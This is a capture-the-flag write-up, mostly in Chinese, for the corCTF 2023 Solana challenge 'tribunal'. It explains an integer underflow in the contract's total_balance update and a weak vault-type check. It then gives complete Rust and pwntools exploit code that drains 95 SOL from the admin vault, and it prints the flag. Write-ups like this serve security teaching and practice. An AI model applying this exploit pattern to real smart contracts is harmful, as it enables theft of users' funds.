---
title: Blockchain - tribunal
description: 2023 | corCTF | blockchain
tags:
    - solana
    - integer underflow
---

## 题目

The yearly CoR tribunal is upon us, and issues vital to the long-term survival of our CTF team are being discussed.

I learned from my mistakes last year, so now this smart contract is much more secure!

> nc be.ax 30555

[:material-download: `tribunal.tar.gz`](static/tribunal.tar.gz)

## 解题思路

- `user` 初始持有 1 SOL

    ```js
    // fund user
    chall
        .run_ix(system_instruction::transfer(&payer, &user, 1_000_000_000)) // 1 sol
        .await?;
    ```

- 目标是获取至少 90 SOL

    ```rs
    // 90 sol
    if account.lamports > 90_000_000_000 {
        writeln!(socket, "you'll be the focus of the next tribunal...")?;
        writeln!(
            socket,
            "flag: {}",
            env::var("FLAG").unwrap_or_else(|_| "corctf{test_flag}".to_string())
        )?;
    }
    ```

- 程序支持的四种指令中，可以通过 Withdraw 获取 SOL，需要保证 `config_data.total_balance` 以及 vault 的余额大于 `amount`

    ```rs
    #[derive(BorshDeserialize, BorshSerialize)]
    pub enum TribunalInstruction {
        Initialize { config_bump: u8, vault_bump: u8 },
        Propose { proposal_id: u8, proposal_bump: u8 },
        Vote { proposal_id: u8, amount: u64 },
        Withdraw { amount: u64 },
    }
    ```

- 程序只检查用户提供的 vault 账户是否是 Vault 类型，因此可以使用 admin 创建的 vault

    ```rs
    if vault_data.discriminator != Types::Vault {
        return Err(ProgramError::InvalidAccountData);
    }
    ```

- 由于程序会检查 config 账户的 admin，因此 config 账户只能使用用户通过 Initialize 创建的，那么就需要修改 `total_balance`，而 `total_balance` 只能通过 Vote 修改
- 注意到在更新 `total_balance` 时，`-100` 没有使用 `checked_sub`，因而可通过下溢出得到充足的 `total_balance`

    ```rs
    // update the config total balance
    config_data.total_balance = config_data.total_balance.checked_add(lamports).unwrap() - 100; // keep some for rent
    ```

### Exploitation

```bash
$ cargo new solve
$ cd solve/
$ mv src/main.rs src/lib.rs
$ cargo add solana_program borsh
$ cargo-build-bpf
```

??? note "Cargo.toml"

    ```
    [package]
    name = "solve"
    version = "0.1.0"
    edition = "2021"

    [dependencies]
    borsh = "0.10.3"
    solana-program = "1.16.5"

    [lib]
    crate-type = ["cdylib", "rlib"]
    ```

!!! note "lib.rs"

    ```rs
    use borsh::{ BorshSerialize };
    use solana_program::{
        account_info::{ next_account_info, AccountInfo },
        instruction::{ AccountMeta, Instruction },
        entrypoint::ProgramResult,
        entrypoint,
        program::invoke,
        pubkey::Pubkey,
        system_program,
    };

    #[derive(BorshSerialize)]
    pub enum TribunalInstruction {
        Initialize { config_bump: u8, vault_bump: u8 },
        Propose { proposal_id: u8, proposal_bump: u8 },
        Vote { proposal_id: u8, amount: u64 },
        Withdraw { amount: u64 },
    }

    entrypoint!(process_instruction);

    pub fn process_instruction(
        _program_id: &Pubkey,
        accounts: &[AccountInfo],
        _instruction_data: &[u8],
    ) -> ProgramResult {
        let iter = &mut accounts.iter();
        let chall_id = next_account_info(iter)?;
        let user = next_account_info(iter)?;
        let user_config = next_account_info(iter)?;
        let user_vault = next_account_info(iter)?;
        let proposal = next_account_info(iter)?;
        let vault = next_account_info(iter)?;

        let config_bump = 252_u8;
        let vault_bump = 253_u8;

        invoke(
            &Instruction {
                program_id: *chall_id.key,
                data: TribunalInstruction::Initialize{config_bump, vault_bump}.try_to_vec().unwrap(),
                accounts: vec![
                    AccountMeta::new(*user.key, true),
                    AccountMeta::new(*user_config.key, false),
                    AccountMeta::new(*user_vault.key, false),
                    AccountMeta::new_readonly(system_program::id(), false),
                ]
            },
            &[
                user.clone(),
                user_config.clone(),    // all accounts should be provided
                user_vault.clone(),
            ]
        )?;

        invoke(
            &Instruction {
                program_id: *chall_id.key,
                data: TribunalInstruction::Vote{proposal_id: 1, amount: 1}.try_to_vec().unwrap(),
                accounts: vec![
                    AccountMeta::new(*user.key, true),
                    AccountMeta::new(*user_config.key, false),
                    AccountMeta::new(*vault.key, false),
                    AccountMeta::new(*proposal.key, false),
                    AccountMeta::new_readonly(system_program::id(), false),
                ]
            },
            &[
                user.clone(),
                vault.clone(),
                user_config.clone(),
                proposal.clone(),
            ]
        )?;

        invoke(
            &Instruction {
                program_id: *chall_id.key,
                data: TribunalInstruction::Withdraw{amount: 95_000_000_000}.try_to_vec().unwrap(),
                accounts: vec![
                    AccountMeta::new(*user.key, true),
                    AccountMeta::new(*user_config.key, false),
                    AccountMeta::new(*vault.key, false),
                    AccountMeta::new_readonly(system_program::id(), false),
                ]
            },
            &[
                user.clone(),
                vault.clone(),
                user_config.clone(),
            ]
        )?;

        Ok(())
    }
    ```

!!! note "solve.py"

    ```py
    from pwn import *
    from solana.publickey import PublicKey
    from solana.system_program import SYS_PROGRAM_ID

    account_metas = [
        ("program", "-r"), # readonly
        ("user", "sw"), # signer + writable
        ("user_config", "-w"),
        ("user_vault", "-w"),
        ("proposal", "-w"),
        ("vault", "-w"),
        ("system program", "-r"),
    ]
    instruction_data = b""

    p = remote("be.ax", 30555)

    with open("solve/target/deploy/solve.so", "rb") as f:
        solve = f.read()

    p.sendlineafter(b"program pubkey: \n", str(PublicKey(b'1' * 32)).encode())
    p.sendlineafter(b"program len: \n", str(len(solve)).encode())
    p.send(solve)

    accounts = {}
    accounts["program"] = p.recvline_contains(b"program: ").strip().split(b": ")[-1].decode()
    accounts["user"] = p.recvline_contains(b"user: ").strip().split(b": ")[-1].decode()

    accounts["system program"] = SYS_PROGRAM_ID.to_base58().decode()

    program_id = PublicKey(accounts["program"])
    config_addr = PublicKey.create_program_address([b"CONFIG", b'\xfc'], program_id) # use a different bump seed from admin
    accounts["user_config"] = config_addr.to_base58().decode()

    vault_addr = PublicKey.create_program_address([b"VAULT", b'\xfd'], program_id)
    accounts["user_vault"] = vault_addr.to_base58().decode()

    vault_addr, vault_bump = PublicKey.find_program_address([b"VAULT"], program_id)
    accounts["vault"] = vault_addr.to_base58().decode() # admin vault
    proposal_addr, proposal_bump = PublicKey.find_program_address([b"PROPOSAL", b"\x01"], program_id)
    accounts["proposal"] = proposal_addr.to_base58().decode()

    p.recvuntil(b"num accounts: \n", drop=True)

    p.sendline(str(len(account_metas)).encode())
    for (name, perms) in account_metas:
        p.sendline(f"{perms} {accounts[name]}".encode())
    p.sendlineafter(b"ix len: \n", str(len(instruction_data)).encode())
    p.send(instruction_data)

    p.interactive()
    ```

### Flag

> corctf{its_y0ur_time_to_f4ce_the_CoR_tribunal}

## 参考资料

- [anchor - how to convert pubkey to accountinfo? - Solana Stack Exchange](https://solana.stackexchange.com/questions/2636/how-to-convert-pubkey-to-accountinfo)
- [Pubkey — solders documentation](https://kevinheavey.github.io/solders/api_reference/pubkey.html)